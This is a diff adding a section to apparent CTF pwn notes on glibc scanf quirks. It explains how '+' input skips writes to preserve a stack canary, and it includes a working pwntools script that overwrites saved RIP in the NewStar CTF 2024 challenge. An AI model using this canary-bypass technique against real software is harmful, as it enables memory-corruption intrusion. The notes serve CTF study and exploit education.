@@ -23,6 +23,7 @@
 - [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
 - [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
 - [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
+- [scanf Input Quirks (Skip, Truncate, Saturate)](#scanf-input-quirks-skip-truncate-saturate)
 - [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
 
 ---
@@ -577,6 +578,72 @@ p.send(b'A' * overflow_to_fp + b'\xa9')
 **References:** P.W.N. CTF 2018 — Important Service, writeup 12041
 
 ---
+
+## scanf Input Quirks (Skip, Truncate, Saturate)
+
+**Pattern:** The target fills a stack array in a loop with `scanf("%d", &arr[i])` - usually with an off-by-one bound or a signed/unsigned loop counter - so later iterations walk over the canary and saved RIP. The canary is random and unprintable, so you cannot simply type it. scanf's conversion rules let you write exactly the slots you want and leave the rest untouched.
+
+### What `%d` stores (glibc)
+
+| Input | Stored value |
+|---|---|
+| `-2147483648` ... `2147483647` | exact |
+| inside `long long` range (`-2^63` ... `2^63-1`) | low 32 bits only - high bits silently truncated |
+| outside `long long` range | `-1` -> `0xFFFFFFFF` (saturation, not wrap) |
+| optionally signed digits then junk, e.g. `1234abcd` | `1234`; scanning stops at the first non-digit |
+
+Non-numeric input in a loop (one conversion per `scanf` call):
+
+| Input | This call | Following calls |
+|---|---|---|
+| `+` or `-` alone | conversion fails, destination untouched | **stream stays usable** - the next scanf reads normally |
+| any other non-digit (`a`, `0x10`, `...`) | conversion fails, destination untouched | offending byte is not consumed -> **every** later scanf fails, all remaining inputs ignored |
+| digits then junk (`1234abcd`) | stores `1234` | junk stays buffered -> next scanf fails |
+
+With one call taking several conversions (`scanf("%d %d %d", ...)`) the first failed conversion invalidates the remaining conversions **of that call only**; earlier ones are still assigned.
+
+### Exploit recipe: skip the canary, keep writing past it
+
+NewStar CTF 2024 *不思議なscanf*: the array is `int v6[6]`, but the loop is `for (i = 0; i <= 15; ++i) scanf("%d", &v6[i])`. Each conversion writes 4 bytes, so 64-bit slots line up as:
+
+| index | location |
+|---|---|
+| 0-5 | declared array |
+| 6-7 | stack canary |
+| 8-9 | saved RBP |
+| 10-11 | saved RIP |
+| 12-15 | caller's frame |
+
+Send `+` for every slot that must not change, and the win/one_gadget address for the RIP slots. No leak, no brute force:
+
+```python
+from pwn import *
+io = process('./pwn')
+WIN = 0x401240                                   # resolve from the binary
+prompt = 'わたし、気になります！'
+
+for i in range(16):
+    if i in (10, 11):                            # little-endian 64-bit WIN across two ints
+        io.sendlineafter(prompt, str((WIN >> (32 * (i - 10))) & 0xffffffff).encode())
+    else:
+        io.sendlineafter(prompt, b'+')           # leave this 4-byte slot untouched
+io.interactive()
+```
+
+The same primitive appears as `scanf("%u", &arr[i])` in **pwnable.tw dubblesort**: `+`/`-` for the canary slot, numbers for the rest, and the bubble sort keeps the array ordered so the return address survives. See [pwnable-tw/dubblesort.md](pwnable-tw/dubblesort.md) and the case study below.
+
+### Other pwn-relevant scanf facts
+
+- `%s` is as dangerous as `gets` (no width means an unbounded write) and, unlike `%d`, stops only at **whitespace** - a space inside a ROP chain splits the payload across conversions and corrupts the chain. Embedded NUL bytes are fine (scanf does not treat them as a terminator), so send raw bytes with `sendline`.
+- `%c` does **not** skip leading whitespace, so `scanf("%d", &n); scanf("%c", &c)` reads the leftover `\n`. `scanf(" %c", &c)` and `scanf("\n%c", &c)` skip it; `scanf("%c\n", &c)` delays completion until a non-matching character arrives.
+- `%u`, `%lld`, `%llu`, `%x`, `%f` share all of the above; the width of the destination moves the truncation and saturation thresholds accordingly.
+- `%d` accepts a leading `+`/`-`, so `str(-1)` writes `0xffffffff` and negative decimals are a way to emit a high-bit-set 32-bit constant when the input filter rejects `0x` hex.
+- The return value counts assigned conversions (`0` on matching failure, `EOF` at end of input) - usable as an oracle for "did this slot accept my value".
+- Saturation to `-1` and long-long truncation are glibc behaviour (C leaves out-of-range conversion undefined); confirm against the challenge's libc before relying on it.
+
+**When to recognize:** numeric menus or loops reading with `%d`/`%u`, a loop bound one too large or driven by a signed/unsigned mismatch, or a check comparing against a positive constant while the value is parsed into a signed int.
+
+**References:** NewStar CTF 2024 - 不思議なscanf (<https://newstar.wiki/wp/2024/week3/pwn/scanf>), "以 Pwn 视角看待 C 函数 —— scanf" (<https://blog.csdn.net/qq_54218833/article/details/121308367>), XCTF dubblesort
 
 ## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)
 
